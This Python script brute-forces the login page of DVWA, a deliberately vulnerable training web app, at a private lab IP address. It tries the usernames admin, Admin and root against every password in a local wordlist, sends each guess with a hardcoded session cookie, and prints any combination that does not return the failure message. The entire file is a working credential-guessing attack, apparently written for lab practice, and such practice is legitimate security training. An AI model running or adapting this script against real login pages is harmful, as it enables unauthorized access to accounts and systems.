import requests
from header_parser import headers_parser

url='http://192.168.1.65/dvwa/vulnerabilities/brute/'

headers='''User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: security=low; PHPSESSID=b650f122d923ff9d9557d11c9f7b8660
Upgrade-Insecure-Requests: 1'''

usernames = ['admin', 'Admin', 'root']
f = open('/root/pass.txt', 'r')
passwords = f.read().split('\n')
passwords.pop()
f.close()

for user in usernames:
	for p in passwords:
		params = {
			'username':user,
			'password':p,
			'Login':'Login'
		}
		res = requests.get(url, params=params, headers=headers_parser(headers))
		if 'Username and/or password incorrect.' in res.text:
			pass
		else:
			print(f'Correct! -> {user,p}')
